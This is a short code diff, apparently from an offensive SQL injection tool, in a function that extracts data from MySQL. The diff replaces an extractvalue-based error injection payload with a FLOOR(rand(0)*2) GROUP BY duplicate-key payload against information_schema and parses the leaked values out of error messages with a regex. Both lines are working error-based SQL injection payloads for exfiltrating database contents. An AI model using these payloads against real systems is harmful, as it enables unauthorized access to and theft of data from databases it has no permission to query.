@@ -71,7 +71,8 @@ namespace murk::xflt::sql {
       case(dbms::MySql): {
         std::string begin = "murkbegin";
         std::string end = "murkend";
-        auto res = oracle(fmt::format("SELECT extractvalue(0,concat(':!@',concat(({}),'@:!')))", sql));
+        auto res = oracle(fmt::format("SELECT 1 FROM(SELECT COUNT(*),concat(':!@',({}),'@:!',"
+                                      "FLOOR(rand(0)*2))x FROM information_schema.PLUGINS GROUP BY x)a", sql));
         return murk::extract(std::regex{":!@(.*)@:!"}, res);
       } break;
       default:
